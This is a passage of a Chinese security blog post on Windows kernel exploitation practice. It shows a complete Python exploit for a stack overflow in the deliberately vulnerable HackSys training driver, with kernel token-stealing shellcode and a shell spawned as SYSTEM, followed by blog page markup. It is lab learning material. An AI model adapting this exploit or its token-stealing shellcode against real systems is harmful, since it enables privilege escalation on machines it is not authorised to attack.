class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">GENERIC_READ           = <span class="number">0x80000000</span></span><br><span class="line">GENERIC_WRITE          = <span class="number">0x40000000</span></span><br><span class="line">OPEN_EXISTING          = <span class="number">0x00000003</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL  = <span class="number">0x00000080</span></span><br><span class="line">MEM_COMMIT             = <span class="number">0x00001000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x00002000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x00000040</span></span><br><span class="line"></span><br><span class="line">NULL = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">  kernel32 = windll.kernel32</span><br><span class="line">  hHEVD = kernel32.CreateFileA(<span class="string">b&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">                               (GENERIC_READ | GENERIC_WRITE),</span><br><span class="line">                               <span class="number">0x00</span>,</span><br><span class="line">                               NULL,</span><br><span class="line">                               OPEN_EXISTING,</span><br><span class="line">                               FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">                               NULL)</span><br><span class="line">  <span class="keyword">if</span> (hHEVD == -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  shellcode = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># python3 sickle.py -a x86 -v shellcode -p windows/x86/kernel_token_stealer -f python3 -m pinpoint</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x60&#x27;</span>                         <span class="comment"># pushal </span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x31\xc0&#x27;</span>                     <span class="comment"># xor eax, eax</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x64\x8b\x80\x24\x01\x00\x00&#x27;</span> <span class="comment"># mov eax, dword ptr fs:[eax + 0x124]</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x8b\x40\x50&#x27;</span>                 <span class="comment"># mov eax, dword ptr [eax + 0x50]</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x89\xc1&#x27;</span>                     <span class="comment"># mov ecx, eax</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\xba\x04\x00\x00\x00&#x27;</span>         <span class="comment"># mov edx, 4</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x8b\x80\xb8\x00\x00\x00&#x27;</span>     <span class="comment"># mov eax, dword ptr [eax + 0xb8]</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x2d\xb8\x00\x00\x00&#x27;</span>         <span class="comment"># sub eax, 0xb8</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x39\x90\xb4\x00\x00\x00&#x27;</span>     <span class="comment"># cmp dword ptr [eax + 0xb4], edx</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x75\xed&#x27;</span>                     <span class="comment"># jne 0x1014</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x8b\x90\xf8\x00\x00\x00&#x27;</span>     <span class="comment"># mov edx, dword ptr [eax + 0xf8]</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x89\x91\xf8\x00\x00\x00&#x27;</span>     <span class="comment"># mov dword ptr [ecx + 0xf8], edx</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x61&#x27;</span>                         <span class="comment"># popal </span></span><br><span class="line"></span><br><span class="line">  shellcode += <span class="string">b&#x27;\x5D&#x27;</span>                         <span class="comment"># pop ebp</span></span><br><span class="line">  shellcode += <span class="string">b&#x27;\xC2\x08\x00&#x27;</span>                 <span class="comment"># ret 0x8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[*] Allocating RWX memory&quot;</span>)</span><br><span class="line">  ptrMemory = kernel32.VirtualAlloc(NULL,</span><br><span class="line">                                    <span class="built_in">len</span>(shellcode),</span><br><span class="line">                                    (MEM_COMMIT | MEM_RESERVE),</span><br><span class="line">                                    PAGE_EXECUTE_READWRITE)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[*] Creating a char array to house shellcode&quot;</span>)</span><br><span class="line">  buffer = (c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[*] Copying shellcode array into RWX memory&quot;</span>)</span><br><span class="line">  kernel32.RtlMoveMemory(c_int(ptrMemory), buffer, <span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">  ptrShellcode = struct.pack(<span class="string">&quot;&lt;L&quot;</span>, ptrMemory)</span><br><span class="line"></span><br><span class="line">  buffer  = <span class="string">b&quot;A&quot;</span> * <span class="number">2080</span></span><br><span class="line">  buffer += ptrShellcode</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[*] Calling control code 0x222003\n&quot;</span>)</span><br><span class="line">  kernel32.DeviceIoControl(hHEVD,</span><br><span class="line">                           <span class="number">0x222003</span>,</span><br><span class="line">                           buffer,</span><br><span class="line">                           <span class="built_in">len</span>(buffer),</span><br><span class="line">                           NULL,</span><br><span class="line">                           <span class="number">0x00</span>,</span><br><span class="line">                           byref(c_ulong()),</span><br><span class="line">                           NULL)</span><br><span class="line"></span><br><span class="line">  os.system(<span class="string">&quot;cmd.exe&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
+
+<p>最终执行该脚本并且在执行前后的控制台输入whoami，如果执行后被修改为了system，则证明利用成功！</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/06/22/Windows_kernel_pwn1-OOB/image-10.png" class title="This is an image-10.png">
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Windows_kernel_pwn1-OOB</li>
+        <li><strong>Author:</strong> zhaojunqi</li>
+        <li><strong>Created at
+                :</strong> 2025-06-22 17:12:58</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-06-22 17:34:08
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/06/22/Windows_kernel_pwn1-OOB/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0/">#Windows内核漏洞调试学习</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/06/22/Windbg%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Windbg双机调试配置</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://www.362478.xyz',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Windows_kernel_pwn1-OOB</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-kernel-pwn1-OOB"><span class="nav-text">Windows_kernel_pwn1-OOB:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="nav-text">调试过程：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#token%E7%AA%83%E5%8F%96%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-text">token窃取流程总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode%EF%BC%9A"><span class="nav-text">shellcode：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%B0%83shellcode%E4%B8%AD%E7%9A%84%E5%81%8F%E7%A7%BB%EF%BC%9A"><span class="nav-text">1.调shellcode中的偏移：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%B0%83%E8%AF%95%E5%8F%91%E9%80%81buffer%E7%9A%84length%EF%BC%8C%E4%BD%BF%E5%BE%97%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%A2%AB%E8%A6%86%E7%9B%96%E4%B8%BAshellcode%E6%89%80%E5%9C%A8%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="nav-text">2.调试发送buffer的length，使得返回地址被覆盖为shellcode所在的地址：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exp%EF%BC%9A"><span class="nav-text">Exp：</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">zhaojunqi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        12 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
